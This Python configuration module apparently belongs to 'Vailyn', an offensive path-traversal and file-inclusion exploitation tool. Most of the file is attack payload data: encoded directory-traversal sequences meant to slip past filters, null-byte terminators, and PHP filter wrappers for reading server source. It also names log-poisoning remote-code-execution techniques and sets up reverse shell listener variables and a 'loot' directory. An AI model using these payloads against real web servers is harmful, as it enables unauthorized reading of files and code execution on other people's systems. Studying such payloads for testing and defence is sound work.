#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;
    , ;
     .

       .
     .;.
     .;
      :
      ,


┌─[Vailyn]─[~]
└──╼ VainlyStrain
"""

import multiprocessing
import sys
import os

# is user running Windows?
is_windows = sys.platform.lower().startswith("win")

# can user run notify2?
adv_li = not is_windows


def generatePayloads():
    """
    generate payload list from a variety of dots and slashes
    """
    dots = [
        "..", ". . ", "%2e%2e", "0x2e0x2e", "%252e%252e",
        "..;", "%c0%2e%c0%2e", "%e0%80%ae%e0%80%ae",
        "%c0%ae%c0%ae", "%25c0%25ae%25c0%25ae", "%%32%65%%32%65",
        "%uff0e%uff0e", "%e0%ae%e0%ae", "%u002e%u002e",
        "%25%32%65%25%32%65", "%%c0%6e%c0%6e", "%c0%5e%c0%5e",
        "%c0%ee%c0%ee", "%c0%fe%c0%fe", "%f0%80%80%ae%f0%80%80%ae",
        ".%2e", "%2e.",
    ]

    slashes = [
        "/", "\\", "%2f", "0x2f", "%255c", "%252f", "%5c",
        "%c0%2f", "0x5c", "%c0%af", "%c1%9c",
        "%25c1%259c", "%%32%66", "%%35%63", "%u2215",
        "%u2216", "%uEFC8", "%uF025", "%e0%af",
        "%e0%80%af", "%c0%5c", "%c0%9v", "%c0%qf", "%c1%8s",
        "%c1%1c", "%c1%af", "%bg%qf", "%25c0%25af",
    ]

    special = [
        "./", ".\\", "....//", "....\\\\", "...//", "...\\\\",
        ".....///", ".....\\\\\\", "..\\/", "../\\", "..././", "...\\.\\",
        "..................................................../",
        "....................................................\\",
        ".?/", "?./", "??/",
    ]

    plist = []
    for dot in list(set(dots)):
        for slash in list(set(slashes)):
            plist.append(dot+slash)

    plist = plist + special
    return plist


payloadlist = generatePayloads()

nullchars = ["%00", "%2500", "%25%30%30", "%u0000", "%c0%80", "%e0%80"]

lfi = False
phase1_wrappers = [
    "pHp://fiLTer/convert.base64-encode/resource=",
    "pHP://fIltEr/read=string.rot13/resource=",
    "PhP://FilTer/convert.iconv.utf-8.utf-16/resource=",
]

wrapper_count = 4

rce = {
    1: "/proc/self/environ Poisoning",
    2: "Apache Access Log Poisoning",
    3: "SSH Log Poisoning",
    4: "Poisoned Mail to Web User",
    5: "Nginx Access Log Poisoning",
    6: "Wrapper RCE ({} submodules)".format(wrapper_count)
}

vector_dict = {
    1: "Query Parameter",
    2: "Path",
    3: "Cookie",
    4: "POST Data, plain",
    5: "POST Data, json",
}

vector_count = len(vector_dict.keys())

# Tor variables
tor = False
initip = ""
torip = ""

timeout = None

# reverse shell variables
revshell = False
LISTENIP = None
LISTENPORT = None

# additional RCE technique for path traversal
implant = False

# crawler list
viclist = []

# arjun stable switch
stable = False

# precise depth flag
precise = False

# clear the terminal, supports both Windows and Unix-like
CLEAR_CMD = ["cmd", "/c", "cls"] if is_windows else ["clear"]

# directory separator
SEPARATOR = "\\" if is_windows else "/"

# set maximal amount of processes
processes = multiprocessing.cpu_count()

lootdir = SEPARATOR.join([
    os.path.dirname(os.path.realpath("__main__")),
    "loot",
    "",
])

cachedir = SEPARATOR.join([
    os.path.dirname(os.path.realpath("__main__")),
    "core",
    "payload-cache",
    "",
])

verbose = False

version = ""
e_version = ""
with open("core/doc/VERSION", "r") as versionfile:
    e_version = versionfile.read().strip()
version = ".".join(e_version.split(".")[0:-1])

user_agents = []
with open("lib/user-agents.txt", "r") as agentfile:
    for line in agentfile:
        line = line.strip()
        if line:
            user_agents.append(line)
